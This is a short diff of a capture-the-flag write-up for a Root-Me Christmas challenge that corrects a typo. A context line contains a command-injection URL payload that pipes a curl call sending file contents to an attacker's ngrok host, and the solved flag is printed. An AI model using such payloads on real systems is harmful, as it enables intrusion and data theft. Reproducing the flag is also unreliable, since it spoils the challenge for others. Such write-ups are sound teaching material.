@@ -47,7 +47,7 @@ end
 https://day18.challenges.xmas.root-me.org/api/message?number=|curl http://ngrokFQDN:port/($cat /*)|
 
 ````
-And I finaly received the flag !  
+And I finally received the flag !  
 <p align="center"><img src="Screenshots/S4.png" alt="Desc"></p>
 
 Flag : _RM{Why_d0esn't_Open_Ju5t_Op3n_in_rUbY??}_ , thanks _Elweth_ for this challenge !
